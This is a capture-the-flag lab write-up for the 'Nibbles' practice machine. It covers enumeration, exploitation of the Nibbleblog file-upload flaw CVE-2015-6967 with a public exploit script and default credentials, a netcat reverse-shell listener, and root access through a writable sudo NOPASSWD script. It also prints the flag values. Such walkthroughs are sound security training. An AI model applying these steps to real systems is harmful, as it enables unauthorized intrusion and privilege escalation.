# Setup
```
export TARGET=10.10.10.75
```

# Network enumeration

Starting small with port `80`

```
$ sudo nmap -p80 --script=http-enum $TARGET
```

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-20 13:03 EST
Nmap scan report for 10.10.10.75
Host is up (0.048s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.30 seconds
```

Found webserver on port 80

Found .php CMS blog system on `/nibbleblog/`

Directory enumeration

## Web App Directory

## Directory enumeration
```sh
$ gobuster dir -u $TARGET/nibbleblog -w /usr/share/wordlists/dirb/common.txt -t 5
```

```sh
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 306]
/.hta                 (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 306]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
Progress: 4614 / 4615 (99.98%)
===========================================================
```

## Exploitation
A quick search for the nibbleblog software reveals CVE-2015-6967.
Enables arbitrary file upload

Exploit implementation:

https://github.com/dix0nym/CVE-2015-6967




**Executing the implementation**

Executing the reverse shell listener

```
sudo nc -lnvp 5000
```

Executing the exploit

```
python3 ./scripts/cve-2015-6967/exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload ./scripts/backdoor.php
```


Exploit can be re-run by executing

```
$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/
```

https://systemweakness.com/a-look-at-cve-2015-6967-fe9a990d57a1
https://github.com/dix0nym/CVE-2015-6967
https://github.com/0xConstant/CVE-2015-6967

# Post exploitation 


Attempting to add myself to `.authorized_keys` for nice `ssh` access.

```sh
nibbler@Nibbles:/$ mkdir .ssh
mkdir: cannot create directory '.ssh': Permission denied
```

## Rudimentary system enumeration


**System information**
```sh 
$ uname -a

Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

```
**User information**
```sh 
$ whoami
nibbles

$id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```


## User flag

Found `/home/nibbler/user.txt`:
```
df6b36ee3798323f6d4b2af47e92fcff
```


# Privelige escalation

Interesting file at `~/personal.zip`

```sh
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
```

Checking contents and permissions
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo --list
sudo --list
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```
Script is vulnerable as it may execute with `sudo` without requiring a password.

Truncating the contents of `monitor.sh`
```sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ truncate -s 0 monitor.sh
```

Getting a root shell
```sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo #!/bin/bash >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo /bin/bash >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
```

Grabbing root flag
```sh
root@Nibbles:~# cat /root/root.txt
15b6e34d27f4413d25f479c18e9c5a5f
```